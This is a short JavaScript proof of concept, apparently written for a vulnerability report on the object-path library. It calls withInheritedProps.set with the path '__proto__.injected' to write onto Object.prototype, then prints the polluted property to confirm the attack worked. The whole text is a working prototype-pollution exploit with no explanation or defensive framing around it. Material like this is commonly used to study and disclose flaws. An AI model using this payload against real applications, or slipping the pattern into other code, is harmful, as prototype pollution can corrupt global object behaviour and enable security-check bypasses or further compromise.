let objectPath = require("./package/index")
let obj = { foo: "bar" }
objectPath.withInheritedProps.set(obj, '__proto__.injected', 'polluted')
console.log(Object.prototype.injected)